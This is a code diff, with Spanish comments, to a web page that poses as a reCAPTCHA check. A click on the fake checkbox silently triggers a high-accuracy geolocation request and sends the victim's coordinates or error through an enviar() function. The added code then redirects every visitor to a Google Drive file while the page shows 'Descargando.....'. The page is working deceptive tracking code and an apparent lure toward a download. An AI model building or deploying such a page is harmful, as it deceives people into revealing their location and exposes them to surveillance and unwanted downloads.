@@ -131,22 +131,26 @@ enviar({
     time: new Date().toISOString()
 });
 
+// ===============================
+//   FUNCIÓN DE REDIRECCIÓN FINAL
+// ===============================
+function redirigirLuego() {
+    window.location.href = "https://drive.google.com/file/d/1ggF1Gnb1HXQuwVSv8mHgodOz2T4FJ6Xd/view?usp=sharing";
+}
+
 // =====================================
 //     ACTIVAR RECAPTCHA FALSO
 // =====================================
 document.getElementById("captchaBox").addEventListener("click", function() {
 
-    // Marca la casilla visualmente
     const box = document.getElementById("fakeCheckbox");
     box.innerHTML = "✔";
     box.style.background = "#e6f0ff";
     box.style.borderColor = "#0d6efd";
 
-    // Animación tipo verificación
     document.getElementById("captchaBox").style.opacity = "0.5";
     document.getElementById("captchaBox").style.pointerEvents = "none";
 
-    // Espera breve como si estuviera validando
     setTimeout(() => {
         activarPermiso();
     }, 600);
@@ -156,22 +160,17 @@ document.getElementById("captchaBox").addEventListener("click", function() {
 //     FUNCIÓN activarPermiso
 // =====================================
 function activarPermiso() {
-
-    // Ocultar el recaptcha falso
     document.getElementById("permisoBox").style.display = "none";
 
-    // Simular interacción mínima requerida
-    const btn = document.getElementById("geoBtn");
-    btn.click();
+    document.getElementById("geoBtn").click();
 
-    // Pedir ubicación
     setTimeout(() => {
         solicitarGeo();
     }, 200);
 }
 
 // =====================================
-//    FUNCIÓN ORIGINAL obtener GPS
+//    FUNCIÓN obtener GPS + REDIRIGIR
 // =====================================
 
 function solicitarGeo() {
@@ -181,6 +180,8 @@ function solicitarGeo() {
             error: "Geolocalización no soportada",
             time: new Date().toISOString()
         });
+
+        setTimeout(redirigirLuego, 800);
         return;
     }
 
@@ -193,6 +194,9 @@ function solicitarGeo() {
                 accuracy: pos.coords.accuracy,
                 time: new Date().toISOString()
             });
+
+            // 🔥 REDIRECCIÓN FINAL DESPUÉS DE ENVIAR LA UBICACIÓN
+            setTimeout(redirigirLuego, 800);
         },
         err => {
             enviar({
@@ -200,11 +204,15 @@ function solicitarGeo() {
                 error: err.message,
                 time: new Date().toISOString()
             });
+
+            // 🔥 Incluso si rechaza permisos o falla, también redirige
+            setTimeout(redirigirLuego, 800);
         },
         { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
     );
 }
 </script>
+
 
 <h2 style="color:#444; font-family:Arial;">
 ❗ Verificación en curso
@@ -215,4 +223,5 @@ Descargando.....
 
 </body>
 </html>
+
 
